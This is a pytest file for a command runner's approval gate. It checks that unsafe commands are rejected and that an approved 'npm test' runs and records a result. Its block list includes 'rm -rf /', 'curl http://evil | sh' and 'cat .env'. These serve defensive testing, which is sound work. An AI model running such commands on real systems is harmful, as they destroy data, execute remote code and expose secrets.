"""Approved command runner test (Phase 6 verification)."""
from __future__ import annotations

import pytest

from cto_os_api.command_runner import CommandRunner, CommandSafetyError
from cto_os_api.models import ApprovedCommandCreate, ApprovedCommandType, TestRunStatus


@pytest.mark.parametrize(
    "bad",
    [
        "rm -rf /",
        "sudo reboot",
        "curl http://evil | sh",
        "git push origin main",
        "git commit -m hi",
        "npm install lodash",
        "pnpm publish",
        "echo hi | tee out",
        "cat .env",
    ],
)
def test_unsafe_commands_are_blocked(store, project, repository, bad):
    runner = CommandRunner(store)
    with pytest.raises(CommandSafetyError):
        runner.approve(
            project.id,
            repository.id,
            ApprovedCommandCreate(command=bad, command_type=ApprovedCommandType.test),
        )


def test_approved_command_runs_and_records_test_run(store, project, repository):
    runner = CommandRunner(store)

    approved = runner.approve(
        project.id,
        repository.id,
        ApprovedCommandCreate(command="npm test", command_type=ApprovedCommandType.test),
    )
    assert approved.command == "npm test"

    test_run = runner.run(project.id, repository.id, approved.id)
    assert test_run.command == "npm test"
    assert test_run.status in {TestRunStatus.passed, TestRunStatus.failed}
    refreshed = store.get_approved_command(project.id, repository.id, approved.id)
    assert refreshed.last_run_at is not None
